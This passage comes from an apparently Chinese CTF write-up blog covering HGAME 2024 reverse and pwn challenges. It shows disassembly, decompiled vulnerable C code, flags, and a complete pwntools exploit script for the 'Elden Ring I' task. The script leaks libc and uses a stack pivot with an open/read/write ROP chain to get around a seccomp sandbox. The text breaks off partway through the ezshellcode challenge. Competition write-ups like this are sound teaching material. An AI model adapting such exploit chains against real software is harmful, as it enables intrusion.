punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><blockquote Wow!Y0u\\_kn0w\\_4\\_l1ttl3\\_0f\\_UPX!\\=\"\">\n<p>VIDAR\\</p>\n</blockquote>\n<h3 id=\"ezida50pt\"><a class=\"markdownIt-Anchor\" href=\"#ezida50pt\">#</a> ezIDA(50pt)</h3>\n<blockquote>\n<p>Do you know how to use IDA?</p>\n</blockquote>\n<p>拖入 IDA 即可发现 flag</p>\n<pre><code class=\"language-assembly\">.text:00000001400010E0 main            proc near               ; CODE XREF: __scrt_common_main_seh(void)+107↓p\n.text:00000001400010E0                                         ; DATA XREF: .pdata:0000000140004018↓o\n.text:00000001400010E0                 push    rbx\n.text:00000001400010E2                 sub     rsp, 20h\n.text:00000001400010E6                 lea     rcx, Format     ; &quot;plz input flag:\\n&quot;\n.text:00000001400010ED                 call    sub_140001020\n.text:00000001400010F2                 lea     rbx, byte_1400030C8\n.text:00000001400010F9                 mov     rdx, rbx\n.text:00000001400010FC                 lea     rcx, a39s       ; &quot;%39s&quot;\n.text:0000000140001103                 call    sub_140001080\n.text:0000000140001108                 lea     r8, aHgameW3lc0meT0 ; &quot;hgame&#123;W3lc0me_T0_Th3_World_of_Rev3rse!&#125;&quot;\n.text:000000014000110F                 sub     r8, rbx\n......\n</code></pre>\n<blockquote W3lc0me\\_T0\\_Th3\\_World\\_of\\_Rev3rse!\\=\"\">\n<p>hgame\\</p>\n</blockquote>\n<h2 id=\"pwn\"><a class=\"markdownIt-Anchor\" href=\"#pwn\">#</a> PWN</h2>\n<h3 id=\"ezsignin25pt\"><a class=\"markdownIt-Anchor\" href=\"#ezsignin25pt\">#</a> EzSignIn(25pt)</h3>\n<blockquote>\n<p>Have fun in pwn games of hgame2024~</p>\n</blockquote>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">nc</span> <span class=\"token number\">47.100</span>.137.175 <span class=\"token number\">31722</span></pre></td></tr></table></figure><blockquote I\\_HATE\\_PWN\\=\"\">\n<p>hgame\\</p>\n</blockquote>\n<h3 id=\"elden-ring-i250pt\"><a class=\"markdownIt-Anchor\" href=\"#elden-ring-i250pt\">#</a> Elden Ring Ⅰ(250pt)</h3>\n<blockquote *******=\"\">\n<p>伊丽莎白学姐沉迷于艾尔登法环无法自拔，你能帮她从梅琳娜那里拿到 flag 吗？ flag 格式为 hgame</p>\n</blockquote>\n<p>栈迁移与 orw 结合</p>\n<p>程序代码</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> __fastcall <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>argv<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>envp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  __int64 v4<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+8h] [rbp-8h]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token function\">init</span><span class=\"token punctuation\">(</span>argc<span class=\"token punctuation\">,</span> argv<span class=\"token punctuation\">,</span> envp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  v4 <span class=\"token operator\">=</span> <span class=\"token function\">seccomp_init</span><span class=\"token punctuation\">(</span><span class=\"token number\">2147418112LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token function\">seccomp_rule_add</span><span class=\"token punctuation\">(</span>v4<span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">59LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token function\">seccomp_rule_add</span><span class=\"token punctuation\">(</span>v4<span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">322LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token function\">seccomp_load</span><span class=\"token punctuation\">(</span>v4<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"The fallen leaves tell a story...\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">2u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"...\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">2u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"...\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">2u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token string\">\"And one other. Whom grace would again bless. A Tarnished of no renown. Cross the fog, to the Lands Between, to stand\"</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token string\">\" before the Elden Ring. And become the Elden Lord.\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">2u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  <span class=\"token function\">vuln</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Good Bye.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token class-name\">ssize_t</span> <span class=\"token function\">vuln</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  <span class=\"token keyword\">char</span> buf<span class=\"token punctuation\">[</span><span class=\"token number\">256</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+0h] [rbp-100h] BYREF</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Greetings. Traveller from beyond the fog. I Am Melina. I offer you an accord.\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">,</span> <span class=\"token number\">0x130uLL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>vuln 有栈溢出漏洞能够溢出 0x30 的大小，也能够发现开启了沙箱。开始想这 ret2libc 可以一步到位，但是程序禁用了 execve，意味着 system 不能够使用（system 底层是由 execve 实现的）</p>\n<p>所以使用 orw 读取 flag。因为测试中发现 orw 去进栈之后，0x30 溢出字节不能够写入。所以使用栈迁移去解决即可。</p>\n<p>exp</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># from ctypes import *</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\"># r = remote('47.100.137.175',30139)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>r <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./vuln'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./libc.so.6'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./vuln'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data         <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data         <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>sea     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data         <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>          <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims             <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>lic     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>pack    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> addr          <span class=\"token punctuation\">:</span> p32<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> length             <span class=\"token punctuation\">:</span> <span class=\"token string\">b'Yhuan'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">//</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'Y'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>it      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token number\">0x100</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>puts_plt <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>puts_got <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>vuln <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'vuln'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>ret <span class=\"token operator\">=</span> <span class=\"token number\">0x000000000040101a</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>rdi <span class=\"token operator\">=</span> <span class=\"token number\">0x00000000004013e3</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>pad1 <span class=\"token operator\">=</span> padding<span class=\"token operator\">*</span><span class=\"token string\">b'a'</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x12345678</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>rdi<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>puts_got<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>puts_plt<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>vuln<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>se<span class=\"token punctuation\">(</span>pad1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>puts <span class=\"token operator\">=</span> lic<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\x7f'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'puts ===>'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>puts<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token comment\"># libc = LibcSearcher('puts',puts)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>libc_base <span class=\"token operator\">=</span> puts <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>read_addr <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'read'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>open_addr <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'open'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>write_addr <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'write'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>rdx<span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span> <span class=\"token number\">0x142c92</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>rsi <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span> <span class=\"token number\">0x2601f</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>buf <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>bss<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x100</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>rax <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span> <span class=\"token number\">0x36174</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>rsp <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span> <span class=\"token number\">0x2f70a</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>syscall_addr <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'syscall'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>pad2<span class=\"token operator\">=</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x108</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rsi<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>read_addr<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rsp<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>buf<span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>se<span class=\"token punctuation\">(</span>pad2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>pad3<span class=\"token operator\">=</span><span class=\"token string\">b'/flag'</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>pad3<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>rdi<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rsi<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>open_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>pad3<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>rdi<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rsi<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>buf<span class=\"token operator\">+</span><span class=\"token number\">0x300</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rdx<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>read_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>pad3<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>rdi<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rsi<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>buf<span class=\"token operator\">+</span><span class=\"token number\">0x300</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rdx<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x50</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>write_addr<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>vuln<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>se<span class=\"token punctuation\">(</span>pad3<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>rc<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>it<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><blockquote D0\\_yoU\\_F4ncy\\_7he\\_E1d3nR1ng?I\\_D0!\\=\"\">\n<p>flag\\</p>\n</blockquote>\n<h3 id=\"ezshellcode100pt\"><a class=\"markdownIt-Anchor\" href=\"#ezshellcode100pt\">#</a> ezshellcode(100pt)</h3>\n<blockquote>\n<p>Short visible shellcode？</p>\n</blockquote>\n<p>整型溢出并绕过判段之后进行可见字符的 shellcode</p>\n<p>程序代码</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> __fastcall <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>argv<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>envp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> v4<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+Ch] [rbp-14h] BYREF</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>v5<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+10h] [rbp-10h]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> __int64 v6<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+18h] [rbp-8h]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  v6 <span class=\"token operator\">=</span> <span class=\"token function\">__readfsqword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token function\">init</span><span class=\"token punctuation\">(</span>argc<span class=\"token punctuation\">,</span> argv<span class=\"token punctuation\">,</span> envp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  v5 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token function\">mmap</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token number\">0x20240000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1000uLL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">33</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token 